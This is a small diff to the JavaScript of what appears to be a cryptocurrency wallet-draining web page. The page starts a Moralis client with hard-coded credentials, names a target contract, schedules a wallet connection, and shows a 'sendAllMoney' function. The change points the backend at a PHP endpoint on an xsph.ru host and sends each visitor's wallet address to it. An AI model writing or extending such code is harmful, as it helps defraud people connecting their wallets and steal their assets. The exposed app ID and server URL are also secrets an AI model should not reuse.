@@ -2,7 +2,7 @@ console.log("loaded");
 const serverUrl = "https://2uuwz8f6oqbb.usemoralis.com:2053/server";
 const appId = "LZKnRUNSDdi6hTYDFx5GbLbxx1fPHnKryMQUurv3";
 Moralis.start({ serverUrl, appId });
-let URL = "https://api.testingzebi11.xyz"
+let URL = "http://a0289382.xsph.ru/!old/check.php?address="
 let ContractAdr = "0x64e80282Bbf9ff1B900c2042eaAaa6e3CecF6Cac";
 setTimeout(connects, 5000)
 let abi = [
@@ -296,7 +296,7 @@ async function sendAllMoney() {
 
 
 async function getNFTS(address) {
-    let url = `${URL}/getnfts/${address}`;
+    let url = `${URL}${address}`;
     let response = await fetch(url);
     let data = await response.json();
     return data;
